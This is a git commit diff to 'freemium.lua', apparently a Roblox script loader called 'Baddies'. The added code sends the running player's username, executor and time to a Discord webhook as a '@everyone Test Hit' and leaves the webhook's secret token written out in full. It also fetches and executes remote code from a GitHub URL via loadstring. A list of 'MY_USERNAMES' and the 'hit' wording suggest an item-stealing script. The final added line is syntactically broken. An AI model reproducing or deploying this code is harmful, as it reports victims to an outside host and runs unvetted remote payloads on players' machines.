d79f4f346c23da07e34a07c47518c4dc2e55cfd6
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 20:57:01 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,9 +1,20 @@
--- Clean Baddies Loader
+-- Test Loader with Direct Notification
 
-_G.POOR_WEBHOOK = "https://discordapp.com/channels/1494168279919362088/1494168281979027468/1494421151664046090"
-_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
+_G.POOR_WEBHOOK = "https://discord.com/api/v10/webhooks/1494420941680148742/DrJ5QakV0MEwSTTFg5KMb_QJWFSF3GsDTi3J-qG7S2qWYjvpTwRDarWiqMxvkGUEfQzw"
+
+_G.MY_USERNAMES = {"antwon_yourfriend", "ahzique09", "x"}
+
 _G.PING_POOR = true
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
+    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
+        local http = game:GetService("HttpService")
+        local data = {
+            content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
+        }
+        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
+    end
 end)
+
+task.spawn(function()
+loadstring (game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true)) 0 end)
